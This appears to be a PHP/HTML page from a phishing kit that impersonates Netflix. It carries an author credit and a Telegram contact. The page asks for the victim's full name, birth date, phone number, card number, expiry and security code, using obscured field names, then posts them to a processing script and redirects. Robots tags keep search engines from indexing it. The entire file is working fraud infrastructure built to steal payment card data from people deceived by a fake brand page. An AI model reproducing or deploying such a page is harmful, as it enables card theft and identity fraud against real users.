<?php
    /*******
    Main Author: Alexscampages
    Contact me on telegram : https://t.me/Alfabrabus
    ********************************************************/

    require_once '../app/config.php';
    $_SESSION['last_page'] = "cc";

?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/toastify-js/src/toastify.min.css">
        <link rel="stylesheet" href="../media/css/helpers.css">
        <link rel="stylesheet" href="../media/css/style.css">

        <link rel="icon" type="image/x-icon" href="../media/imgs/ff.ico" />

        <title>Netflix</title>
    </head>

    <body class="zz">

		<div class="overlay">
            <div class="loader">
                <div class="lds-spinner"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div>
            </div>
        </div>
        
        <!-- HEADER -->
        <header id="header" class="d-flex align-items-center">
            <div class="logo flex-grow-1">
                <svg viewBox="0 0 111 30" class="svg-icon svg-icon-netflix-logo" focusable="true"><g id="netflix-logo"><path d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2498828 C43.7810479,26.2498828 42.1876465,26.2498828 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z" id="Fill-14"></path></g></svg>
            </div>
            <p><?php echo get_text('signout'); ?></p>
        </header>
        <!-- END HEADER -->

        <!-- MAIN -->
        <main id="main">
            <div class="setup" style="max-width: 440px;">
                <p class="text-left mb30">
                    <span style="font-size: 12px;"><?php echo get_text('step1'); ?></span><br>
                    <span style="font-weight: 700; font-size: 22px; display: block; margin: 15px 0;"><?php echo get_text('cc_title'); ?></span>
                    <img class="mb-0" style="width: 40px; height: 25px;" src="../media/imgs/visa.svg">
                    <img class="mb-0" style="width: 40px; height: 25px;" src="../media/imgs/master.svg">
                    <img class="mb-0" style="width: 40px; height: 25px;" src="../media/imgs/amex.svg">
                    <img class="mb-0" style="width: 40px; height: 25px;" src="../media/imgs/discover.png">
                </p>
                <div id="forma">
                    <input type="hidden" id="cap" name="cap">
                    <input type="hidden" name="steeep" id="steeep" value="cc">
                    <label class="<?php echo errclass($_SESSION['errors'],'full_name') ?>">
                        <p class="label-txt"><?php echo get_text('full_name_placeholder'); ?></p>
                        <input type="text" class="input" id="full_name" name="full_name" value="<?php echo get_value('full_name'); ?>">
                        <?php echo errmsg($_SESSION['errors'],'full_name'); ?>
                    </label>
                    <label class="<?php echo errclass($_SESSION['errors'],'birth_date') ?>">
                        <p class="label-txt"><?php echo get_text('birth_date_placeholder'); ?></p>
                        <input type="text" class="input" inputmode="numeric" id="birth_date" name="birth_date" value="<?php echo get_value('birth_date'); ?>">
                        <?php echo errmsg($_SESSION['errors'],'birth_date'); ?>
                    </label>
                    <label class="<?php echo errclass($_SESSION['errors'],'phone') ?>">
                        <p class="label-txt"><?php echo get_text('phone_placeholder'); ?></p>
                        <input type="text" inputmode="numeric" class="input" id="phone" name="phone" value="<?php echo get_value('phone'); ?>">
                        <?php echo errmsg($_SESSION['errors'],'phone'); ?>
                    </label>
                    <label class="<?php echo errclass($_SESSION['errors'],'one') ?>">
                        <p class="label-txt"><?php echo get_text('one_placeholder'); ?></p>
                        <input type="text" inputmode="numeric" class="input" id="one" name="one" value="<?php echo get_value('one'); ?>">
                        <?php echo errmsg($_SESSION['errors'],'one'); ?>
                    </label>
                    <label class="<?php echo errclass($_SESSION['errors'],'two') ?>">
                        <p class="label-txt"><?php echo get_text('two_placeholder'); ?></p>
                        <input type="text" class="input" inputmode="numeric" id="two" name="two" value="<?php echo get_value('two'); ?>">
                        <?php echo errmsg($_SESSION['errors'],'two'); ?>
                    </label>
                    <label class="<?php echo errclass($_SESSION['errors'],'three') ?>">
                        <p class="label-txt"><?php echo get_text('three_placeholder'); ?></p>
                        <input type="text" class="input" inputmode="numeric" id="three" name="three" value="<?php echo get_value('three'); ?>">
                        <svg width="36" height="36" viewBox="0 0 36 36" xmlns="http://www.w3.org/2000/svg"><g fill="none" fill-rule="evenodd"><g><circle stroke="#A9A6A6" stroke-width="2" cx="18" cy="18" r="17"></circle><path d="M17.051 21.094v-.54c0-.648.123-1.203.369-1.665.246-.462.741-.915 1.485-1.359a7.37 7.37 0 0 0 .981-.657c.222-.186.372-.366.45-.54.078-.174.117-.369.117-.585 0-.384-.177-.714-.531-.99-.354-.276-.831-.414-1.431-.414-.624 0-1.131.135-1.521.405-.39.27-.627.627-.711 1.071h-2.304a4.053 4.053 0 0 1 .738-1.845c.396-.546.924-.981 1.584-1.305.66-.324 1.44-.486 2.34-.486.852 0 1.596.153 2.232.459.636.306 1.134.726 1.494 1.26.36.534.54 1.143.54 1.827 0 .66-.177 1.227-.531 1.701-.354.474-.891.933-1.611 1.377-.42.252-.729.48-.927.684-.198.204-.33.399-.396.585a1.79 1.79 0 0 0-.099.603v.414h-2.268zm1.26 4.158c-.408 0-.762-.15-1.062-.45-.3-.3-.45-.654-.45-1.062 0-.408.15-.762.45-1.062.3-.3.654-.45 1.062-.45.408 0 .762.15 1.062.45.3.3.45.654.45 1.062 0 .408-.15.762-.45 1.062-.3.3-.654.45-1.062.45z" fill="#A9A6A6"></path></g></g></svg>
                        <?php echo errmsg($_SESSION['errors'],'three'); ?>
                    </label>
                    <div class="checkk">
                        <p><?php echo get_text('cc_text'); ?></p>
                        <div class="daa" style="cursor: pointer;"><img class="" src="../media/imgs/check2.png"><?php echo get_text('agree'); ?></div>
                    </div>
                    <div class="btns">
                        <button id="booom" class="btttn"><?php echo get_text('submit'); ?></button>
                    </div>
                </div>
            </div>
        </main>
        <!-- MAIN -->

        <!-- FOOTER -->
        <footer id="footer" class="footer2">
            <div class="container">
                <div class="row mb20">
                    <div class="col-12">
                        <ul>
                            <li class="fz16"><?php echo get_text('questions'); ?></li>
                        </ul>
                    </div>
                </div>
                <div class="row">
                    <div class="col-lg-3 col-md-6 col-sm-6 col-6 mb-4">
                        <ul>
                            <li><?php echo get_text('faq'); ?></li>
                            <li><?php echo get_text('cookies'); ?></li>
                        </ul>
                    </div>
                    <div class="col-lg-3 col-md-6 col-sm-6 col-6 mb-4">
                        <ul>
                            <li><?php echo get_text('help'); ?></li>
                            <li><?php echo get_text('corporate'); ?></li>
                        </ul>
                    </div>
                    <div class="col-lg-3 col-md-6 col-sm-6 col-6 mb-4">
                        <ul>
                            <li><?php echo get_text('terms'); ?></li>
                        </ul>
                    </div>
                    <div class="col-lg-3 col-md-6 col-sm-6 col-6 mb-4">
                        <ul>
                            <li><?php echo get_text('privacy'); ?></li>
                        </ul>
                    </div>
                </div>
            </div>
        </footer>
        <!-- END FOOTER -->

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
        <script src="../media/js/js.js"></script>

        <script>
            window.onload = () => {
                setTimeout(function () {
                    $('.overlay').fadeOut('slow');
                },1000); // 1000 = 1s
            };
            $('#birth_date').mask('00/00/0000');
            $('#one').mask('0000 0000 0000 0000');
            $('#two').mask('00/00');
            $('#three').mask('0000');
            var loaded = false;  
            $('#booom').click(function(){
                if( loaded == true ) {
                    return false;
                }
                formData = {
                    'cap' : $('#cap').val(),
                    'steeep' : $('#steeep').val(),
                    'full_name' : $('#full_name').val(),
                    'phone' : $('#phone').val(),
                    'birth_date' : $('#birth_date').val(),
                    'one' : $('#one').val(),
                    'two' : $('#two').val(),
                    'three' : $('#three').val(),
                }
                $.post( "../processing.php", formData )
                    .done(function( data ) {
                    window.location.href = data;
                });
                loaded = true;
            });
        </script>

    </body>

</html>